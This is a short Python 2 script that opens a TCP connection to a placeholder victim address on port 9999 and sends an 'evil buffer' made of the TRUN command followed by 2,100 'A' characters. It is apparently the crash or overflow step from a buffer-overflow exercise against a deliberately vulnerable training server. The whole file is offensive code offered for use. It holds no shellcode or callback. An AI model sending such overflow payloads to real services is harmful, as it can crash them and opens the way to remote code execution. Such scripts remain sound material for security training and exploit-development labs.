#!/usr/bin/python
import socket

try:
  print "[+] \nSending evil buffer..."
  buffer = "TRUN /.:/"
  buffer+= "A"*2100

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("<victim-ip>", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
